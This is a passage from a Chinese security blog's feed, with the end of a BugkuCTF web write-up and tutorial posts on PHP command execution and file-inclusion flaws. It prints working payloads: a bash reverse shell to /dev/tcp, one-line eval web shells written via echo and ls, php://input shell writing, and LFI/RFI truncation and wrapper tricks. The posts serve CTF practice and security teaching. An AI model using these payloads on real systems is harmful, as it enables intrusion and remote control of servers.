class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>代码都在这里怎么改都行了<br>大于1000000就post个表单。。<br>我干脆构造一个post表单提交就好了</p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>备份，典型的源码泄露<br>直接访问index.php.bak<br>下载下来看一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);</span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>md5相等，值不等。。<br>php隐式转换的缺陷，PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0<br>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0<br>240610708和QNKCDZO<br>但还是有一个坑str_replace过滤了key<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure></p><p>成了</p><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>嗯，sql注入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure></p><p>不报错。<br>union查询和时间盲注<br>丢到sqlmap直接跑<br><img src="BugkuCTF-chengjidan.png" alt=""></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p><img src="BugkuCTF-qiumingshan.png" alt=""><br>写个小jio本吧….<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from lxml import html</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">requests = requests.Session()</span><br><span class="line">rs = requests.get(url)</span><br><span class="line">rs = html.fromstring(rs.content)</span><br><span class="line">rs = str(rs.xpath(<span class="string">'//div/text()'</span>))</span><br><span class="line">rs = <span class="built_in">eval</span>(rs[2:-5])</span><br><span class="line">data=&#123;</span><br><span class="line">  <span class="string">'value'</span>: rs</span><br><span class="line">&#125;</span><br><span class="line">rs = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><p>如果值名不对会提示用value:Give me value post about….</p><p>原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND}<br>[Finished in 0.9s]</p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>hint:格式KEY{xxxxxxxxxxxxxx}<br>数据包里有东西<br><img src="BugkuCTF-web6.png" alt=""><br>看着像base64，解码<br>按照提示POST一个参数margin=WQpzogT0RJek9EVXc=<br>提示让快点，脚本侍候，不行加个解码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">rs = session.get(url).headers[<span class="string">'flag'</span>]</span><br><span class="line">flag = base64.b64decode(base64.b64decode(rs).split(<span class="string">':'</span>)[1])</span><br><span class="line">payload = &#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line">rs = session.post(url,payload)</span><br><span class="line"><span class="built_in">print</span> rs.content</span><br></pre></td></tr></table></figure></p><h2 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h2><p>刚开始还以为真搞cookie<br>实际上是文件包含泄漏主页源码<br>请求url参数经过base64编码，解码发现是keys.txt,把index.php编码一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span><br></pre></td></tr></table></figure></p><p>只有一行，注意到line参数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,20):</span><br><span class="line">  url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span></span><br><span class="line">  rs = requests.get(url)</span><br><span class="line">  <span class="built_in">print</span> rs.text</span><br></pre></td></tr></table></figure></p><p>循环读一下源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=base64_decode(isset(<span class="variable">$_GET</span>[<span class="string">'filename'</span>])?<span class="variable">$_GET</span>[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"><span class="variable">$line</span>=isset(<span class="variable">$_GET</span>[<span class="string">'line'</span>])?intval(<span class="variable">$_GET</span>[<span class="string">'line'</span>]):0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_list</span> = array(</span><br><span class="line">  <span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line">  <span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$file_list</span>[2]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$file</span>, <span class="variable">$file_list</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$fa</span> = file(<span class="variable">$file</span>);</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$fa</span>[<span class="variable">$line</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这下名副其实cookie欺骗了<br><img src="BugkuCTF-web11.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先放出bugkuctf网址:&lt;a href=&quot;http://ctf.bugku.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;click me&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://0xp1n3.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>命令执行那些事</title>
    <link href="https://0xp1n3.github.io/2018/09/09/safe-command-exec/"/>
    <id>https://0xp1n3.github.io/2018/09/09/safe-command-exec/</id>
    <published>2018-09-09T12:39:32.000Z</published>
    <updated>2019-03-18T12:21:26.043Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令执行定义"><a href="#命令执行定义" class="headerlink" title="命令执行定义"></a>命令执行定义</h2><p>使用执行系统命令的函数时，没有进行过滤</p><ul><li>继承web服务器权限</li></ul><h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><a id="more"></a><blockquote><ul><li>system(返回最后一行)</li><li>exec</li><li>passthru(返回最后一行)</li><li>shell_exec 作用与 <code></code>反引号一致</li><li>popen(返回文件指针)</li><li>proc_open(返回文件指针)</li><li>pcntl_exec 多进程处理扩展,需额外安装 (string $path, array $args, array $envs)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$w = <span class="string">'whoami'</span>;</span><br><span class="line"></span><br><span class="line">system($w);</span><br><span class="line">passthru($w);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>.<span class="string">'exec:'</span>.exec($w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'shell_exec:'</span>.shell_exec($w).<span class="string">'&lt;br/&gt;'</span>; </span><br><span class="line"><span class="keyword">echo</span> `$w`;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> popen(<span class="string">'whoami'</span>,<span class="string">'r'</span>); <span class="comment">//(cmd,mode[r,w])//读和写</span></span><br><span class="line">proc_open(<span class="string">'proc_open:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">pcntl_exec(<span class="string">'pcntl_exec:'</span>.$w).<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令执行防御函数"><a href="#命令执行防御函数" class="headerlink" title="命令执行防御函数"></a>命令执行防御函数</h2><blockquote><ul><li>escapeshellarg() //转义参数 将引号替换为空格</li><li>escapeshellcmd() //过滤整条命令(win下加^ linux加\)</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'ls '</span>.escapeshellarg(<span class="string">'a"'</span>);</span><br></pre></td></tr></table></figure><p>过滤字符有<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %</span><br><span class="line"><span class="string">' " 在不成对情况下也过滤</span></span><br></pre></td></tr></table></figure></p><h2 id="代码执行相关函数"><a href="#代码执行相关函数" class="headerlink" title="代码执行相关函数"></a>代码执行相关函数</h2><blockquote><ul><li>eval</li><li>assert</li><li>preg_replace (php&lt;=5.5)</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li></ul></blockquote><p>前两个就不说了，一句话常见</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索subject中匹配pattern的部分， 以replacement进行替换。</span></span><br><span class="line"><span class="comment">//当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">preg_replace(“/test/e”,$_GET[<span class="string">"cmd"</span>],”jutsttest”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?value=[phpinfo()]</span></span><br><span class="line">preg_replace(<span class="string">'/\[(.*)\]/e'</span>, <span class="string">'strtolower("\\1")'</span>, $_GET[<span class="string">'value'</span>]);</span><br><span class="line"><span class="comment">//strtolower("\\1")实际就是\1 而\1在正则中有自己的含义</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>反向引用</strong></p></blockquote><blockquote><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><blockquote><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace</a></p><p>所以这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项,即value中第一个子匹配项,达到代码执行目的</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- call_user_func()</span><br><span class="line">- call_user_func_array()</span><br><span class="line">- array_map()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//调用其他函数功能</span></span><br><span class="line"><span class="comment">//第一个参数为回调函数,后面的参数为回调函数的参数</span></span><br><span class="line">$b = <span class="string">'phpinfo()'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>], $b);</span><br><span class="line"><span class="comment">//当?a=eval时就调用了eval函数而phpinfo()作为参数</span></span><br></pre></td></tr></table></figure><h2 id="命令执行常用符"><a href="#命令执行常用符" class="headerlink" title="命令执行常用符"></a>命令执行常用符</h2><blockquote><ul><li>Windows支持的管道符<br>| 直接执行后边的<br>|| 如果前面执行出错，执行后边，只能为假<br>&amp; 如果前面语句为假则直接执行后边，前边可真可假<br>&amp;&amp; 前边假出错，前边只能为真</li><li>Linux支持的管道符<br>; 执行完前边执行后边<br>| 先是后边语句执行结果<br>|| 当前语句执行出错，执行后边<br>&amp; 如果前边为假直接执行后边，前面可真可假<br>&amp;&amp; 如果前边为假出错，只能为真</li></ul></blockquote><h2 id="命令执行的奇淫技巧"><a href="#命令执行的奇淫技巧" class="headerlink" title="命令执行的奇淫技巧"></a>命令执行的奇淫技巧</h2><ul><li>绕过黑名单<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a1;b=s;$a$b</span><br></pre></td></tr></table></figure></li></ul><h3 id="无回显绕过方法"><a href="#无回显绕过方法" class="headerlink" title="无回显绕过方法"></a>无回显绕过方法</h3><ul><li><p>弹shell，nc监听判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -p 8080 -vvv</span><br><span class="line">|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><p>利用DNS隧道<br><a href="https://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ?" target="_blank" rel="noopener">参考文章</a></p></li></ul><h3 id="利用echo写马"><a href="#利用echo写马" class="headerlink" title="利用echo写马"></a>利用echo写马</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php @eval($_GET[1]);?&gt;'</span>&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><p>如果长度有限制可以追加绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php'</span>&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'@eval('</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$_GET['</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'1]);'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'?&gt;'</span>&gt;&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>或者用反斜杠\拼接<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval(\</span></span><br><span class="line"><span class="string">\$_POST[1]); ?&gt;"</span>\</span><br><span class="line">&gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p><p>使用单引号的时候反斜杠会写进语句的里面，所以使用双引号，然后在$的前面加一个反斜杠转义</p><h3 id="利用ls写马"><a href="#利用ls写马" class="headerlink" title="利用ls写马"></a>利用ls写马</h3><p>通过ls -t按时间排列写马<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'?&gt;'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'($_POST[1]);'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'@eval'</span></span><br><span class="line"><span class="keyword">echo</span> &gt; <span class="string">'&lt;?php'</span></span><br><span class="line">ls -t &gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;命令执行定义&quot;&gt;&lt;a href=&quot;#命令执行定义&quot; class=&quot;headerlink&quot; title=&quot;命令执行定义&quot;&gt;&lt;/a&gt;命令执行定义&lt;/h2&gt;&lt;p&gt;使用执行系统命令的函数时，没有进行过滤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;继承web服务器权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;命令执行相关函数&quot;&gt;&lt;a href=&quot;#命令执行相关函数&quot; class=&quot;headerlink&quot; title=&quot;命令执行相关函数&quot;&gt;&lt;/a&gt;命令执行相关函数&lt;/h2&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://0xp1n3.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="命令执行" scheme="https://0xp1n3.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web安全" scheme="https://0xp1n3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞小结</title>
    <link href="https://0xp1n3.github.io/2018/08/09/safe-include/"/>
    <id>https://0xp1n3.github.io/2018/08/09/safe-include/</id>
    <published>2018-08-09T11:32:52.000Z</published>
    <updated>2019-03-18T12:05:00.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>包含操作是指大多数语言提供的功能<br>常见如下:<br><a id="more"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span></span><br></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;include file=<span class="string">"header.jsp"</span>/&gt;</span><br></pre></td></tr></table></figure><p>包含漏洞在php中经常出现，但并不意味着只在php中出现</p><h2 id="文件包含漏洞成因"><a href="#文件包含漏洞成因" class="headerlink" title="文件包含漏洞成因"></a>文件包含漏洞成因</h2><p>代码重用时经常进行文件包含，如果参数暴露可控<br>通过恶意操作，可以达到攻击的目的</p><h2 id="文件包含相关函数"><a href="#文件包含相关函数" class="headerlink" title="文件包含相关函数"></a>文件包含相关函数</h2><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><p>前两者遇到错误会继续,后两者会报错退出</p><h2 id="文件包含类型"><a href="#文件包含类型" class="headerlink" title="文件包含类型"></a>文件包含类型</h2><h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI 本地文件包含"></a>LFI 本地文件包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>);</span><br><span class="line">$mod = $_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a>RFI 远程文件包含</h3><p>要求</p><ul><li>allow_url_include = ON</li><li>allow_url_fopen = ON</li></ul><p>包含文件并解析成PHP，如果fopen为OFF，需要伪协议才能包含</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件包含截断技术"><a href="#文件包含截断技术" class="headerlink" title="文件包含截断技术"></a>文件包含截断技术</h2><p>开发者常用这样的语句进行文件类型的限定</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>($mod.<span class="string">'.php'</span>);</span><br></pre></td></tr></table></figure><p>导致无法包含指定文件</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> 截断条件</span></span><br><span class="line"><span class="comment"> 无GPC,addslashes过滤</span></span><br><span class="line"><span class="comment"> php &lt;=5.3.40</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">?mod=<span class="number">2.</span>txt%<span class="number">00</span></span><br></pre></td></tr></table></figure><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><ul><li>Windows下目录最大长度为256字节，超出的部分会被丢弃；</li><li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 截断条件</span></span><br><span class="line"><span class="comment"> php &lt;=5.3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">php??mod=<span class="number">2.</span>txt..............</span><br></pre></td></tr></table></figure></li></ul><h3 id="‘-’问号伪截断-RFI"><a href="#‘-’问号伪截断-RFI" class="headerlink" title="‘?’问号伪截断 RFI"></a>‘?’问号伪截断 RFI</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php?filename=http://127.0.0.1/FI/php.txt?.php</span><br></pre></td></tr></table></figure><h3 id="号空格截断"><a href="#号空格截断" class="headerlink" title="#号空格截断"></a>#号空格截断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php?filename=http://127.0.0.1/FI/php.txt%23</span><br><span class="line">%20</span><br></pre></td></tr></table></figure><h3 id="php-input截断"><a href="#php-input截断" class="headerlink" title="php://input截断"></a>php://input截断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.php?a=php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="附录-PHP伪协议"><a href="#附录-PHP伪协议" class="headerlink" title="附录:PHP伪协议"></a>附录:PHP伪协议</h2><blockquote><h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php://filter（本地磁盘文件进行读取）"></a>php://filter（本地磁盘文件进行读取）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?filename=php://filter/convert.base64-encode/resource=xxx.php</span><br><span class="line">&gt; ?filename=php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="php-input-post"><a href="#php-input-post" class="headerlink" title="php://input(post)"></a>php://input(post)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=php://input</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="php-input（写shell）"><a href="#php-input（写shell）" class="headerlink" title="php://input（写shell）"></a>php://input（写shell）</h3><p>三个条件</p><ul><li>allow_url_fopen on</li><li>allow_url_include on</li><li>满足php&lt;5.3.0</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="php-input（命令执行）"><a href="#php-input（命令执行）" class="headerlink" title="php://input（命令执行）"></a>php://input（命令执行）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; post</span><br><span class="line">&gt; </span><br><span class="line">&gt; &lt;?php system(&apos;whoami&apos;);?&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="file-伪协议（读取文件内容）"><a href="#file-伪协议（读取文件内容）" class="headerlink" title="file://伪协议（读取文件内容）"></a>file://伪协议（读取文件内容）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; php?filename=file://c:/boot.ini</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;  data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="data-读取文件"><a href="#data-读取文件" class="headerlink" title="data://(读取文件)"></a>data://(读取文件)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; data://text/plain;base64,SSBsb3ZlIFBIUAo=</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h3><ul><li>PHP &gt;= 5.3.0 </li><li>压缩包需要是zip协议压缩</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; <span class="number">1.</span>写一个一句话木马文件shell.php，</span><br><span class="line">&gt; <span class="number">2.</span>用zip协议压缩为shell.zip，</span><br><span class="line">&gt; <span class="number">3.</span>将后缀改为png等其他格式</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=phar://压缩包/内部文件 </span><br><span class="line">&gt; ?file=phar://xxx.png/shell.php</span><br><span class="line">&gt; # 改为其他任意格式的文件都可以正常使用 </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><ul><li>PHP &gt;= 5.3.0</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a&gt;文件包含&lt;/h2&gt;&lt;p&gt;包含操作是指大多数语言提供的功能&lt;br&gt;常见如下:&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://0xp1n3.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="渗透测试" scheme="https://0xp1n3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web安全" scheme="https://0xp1n3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件包含" scheme="https://0xp1n3.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>HEXO配置教程(Next.Mist主题)</title>
    <link href="https://0xp1n3.github.io/2018/07/24/hexo-config/"/>
    <id>https://0xp1n3.github.io/2018/07/24/hexo-config/</id>
    <published>2018-07-24T13:23:04.000Z</published>
    <updated>2018-11-09T22:22:42.000Z</updated>
    
